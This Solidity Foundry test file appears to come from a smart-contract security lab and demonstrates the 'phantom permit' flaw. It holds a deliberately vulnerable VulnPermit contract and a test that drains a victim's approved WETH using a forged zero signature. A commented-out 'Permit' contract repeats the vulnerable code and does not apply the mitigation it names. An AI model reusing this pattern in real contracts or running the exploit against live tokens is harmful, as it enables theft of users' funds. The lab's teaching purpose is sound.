// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/*

Name: Phantom function - Permit Function 

Description:
Phantom function: Accepts any call to a function that it doesn't actually define, without reverting.
key:
1.Token that does not support EIP-2612 permit. 
2.Token has a fallback function.
For example: WETH.

Mitigation:  
Use SafeERC20's safePermit - Revert on invalid signature.
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24

REF:
https://twitter.com/1nf0s3cpt/status/1671347058568237057
https://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f
*/

contract ContractTest is Test {
    VulnPermit VulnPermitContract;
    WETH9 WETH9Contract;

    function setUp() public {
        WETH9Contract = new WETH9();
        VulnPermitContract = new VulnPermit(IERC20(address(WETH9Contract)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.startPrank(alice);
        WETH9Contract.deposit{value: 10 ether}();
        WETH9Contract.approve(address(VulnPermitContract), type(uint256).max);
        vm.stopPrank();
        console.log(
            "start WETH balanceOf this",
            WETH9Contract.balanceOf(address(this))
        );

        VulnPermitContract.depositWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = WETH9Contract.balanceOf(address(VulnPermitContract));
        console.log("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitContract.withdraw(1000);

        wbal = WETH9Contract.balanceOf(address(this));
        console.log("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract VulnPermit {
    IERC20 public token;

    constructor(IERC20 _token) {
        token = _token;
    }

    function deposit(uint256 amount) public {
        require(
            token.transferFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
    }

    function depositWithPermit(
        address target,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool success, ) = address(token).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                target,
                amount,
                v,
                r,
                s
            )
        );
        require(success, "Permit failed");

        require(
            token.transferFrom(target, address(this), amount),
            "Transfer failed"
        );
    }

    function withdraw(uint256 amount) public {
        require(token.transfer(msg.sender, amount), "Transfer failed");
    }
}

// contract Permit {
//     IERC20 public token;

//     constructor(IERC20 _token) {
//         token = _token;
//     }

//     function deposit(uint256 amount) public {
//         require(
//             token.transferFrom(msg.sender, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function depositWithPermit(
//         address target,
//         uint256 amount,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) public {
//         (bool success, ) = address(token).call(
//             abi.encodeWithSignature(
//                 "permit(address,uint256,uint8,bytes32,bytes32)",
//                 target,
//                 amount,
//                 v,
//                 r,
//                 s
//             )
//         );
//         require(success, "Permit failed");

//         require(
//             token.transferFrom(target, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function withdraw(uint256 amount) public {
//         require(token.transfer(msg.sender, amount), "Transfer failed");
//     }
// }

contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);
    event Deposit(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        deposit();
    }

    receive() external payable {}

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        payable(msg.sender).transfer(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(balanceOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}
